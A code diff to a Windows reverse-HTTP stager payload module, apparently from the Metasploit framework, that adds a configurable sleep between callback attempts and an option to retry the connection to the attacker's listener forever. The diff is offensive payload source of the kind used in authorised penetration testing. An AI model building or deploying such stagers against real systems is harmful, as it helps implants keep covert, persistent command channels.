@@ -29,7 +29,8 @@ module Payload::Windows::ReverseHttp
     super
     register_advanced_options([
         OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
-        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10]),
+        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails (zero to infinite retries)', 10]),
+        OptInt.new('StagerRetryWait', [false, 'Number of seconds to wait for the stager between reconnect attempts', 5]),
         OptString.new('PayloadProxyHost', [false, 'An optional proxy server IP address or hostname']),
         OptPort.new('PayloadProxyPort', [false, 'An optional proxy server port']),
         OptString.new('PayloadProxyUser', [false, 'An optional proxy server username']),
@@ -47,7 +48,8 @@ module Payload::Windows::ReverseHttp
       ssl:         opts[:ssl] || false,
       host:        ds['LHOST'],
       port:        ds['LPORT'],
-      retry_count: ds['StagerRetryCount']
+      retry_count: ds['StagerRetryCount'],
+      retry_wait: ds['StagerRetryWait']
     }
 
     # Add extra options if we have enough space
@@ -153,10 +155,12 @@ module Payload::Windows::ReverseHttp
   # @option opts [String] :proxy_user The optional proxy server username
   # @option opts [String] :proxy_pass The optional proxy server password
   # @option opts [Integer] :retry_count The number of times to retry a failed request before giving up
+  # @option opts [Integer] :retry_wait The seconds to wait before retry a new request
   #
   def asm_reverse_http(opts={})
 
-    retry_count   = [opts[:retry_count].to_i, 1].max
+    retry_count   = opts[:retry_count].to_i
+    retry_wait   = opts[:retry_wait].to_i * 1000
     proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
     proxy_info    = ""
 
@@ -315,14 +319,20 @@ module Payload::Windows::ReverseHttp
         push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
         call ebp
         xchg esi, eax          ; save hHttpRequest in esi
-
+     ^
+    if retry_count > 0
+      asm << %Q^
       ; Store our retry counter in the edi register
       set_retry:
         push #{retry_count}
         pop edi
+      ^
+    end
 
+    asm << %Q^
       send_request:
     ^
+
 
     if opts[:ssl]
       asm << %Q^
@@ -349,14 +359,30 @@ module Payload::Windows::ReverseHttp
         push 0x7B18062D        ; hash( "wininet.dll", "HttpSendRequestA" )
         call ebp
         test eax,eax
-        jnz allocate_memory
+        jnz allocate_memory  
+   
+     set_wait:
+        push #{retry_wait}     ; dwMilliseconds
+        push 0xE035F044        ; hash( "kernel32.dll", "Sleep" )
+        call ebp               ; Sleep( dwMilliseconds );
+      ^
+    
+    if retry_count > 0
+      asm << %Q^
+        try_it_again:
+          dec edi
+          jnz send_request
 
-      try_it_again:
-        dec edi
-        jnz send_request
+        ; if we didn't allocate before running out of retries, bail out
+        ^
+    else
+      asm << %Q^
+        try_it_again:
+          jmp send_request
 
-      ; if we didn't allocate before running out of retries, bail out
-    ^
+        ; retry forever
+        ^
+    end
 
     if opts[:exitfunk]
       asm << %Q^
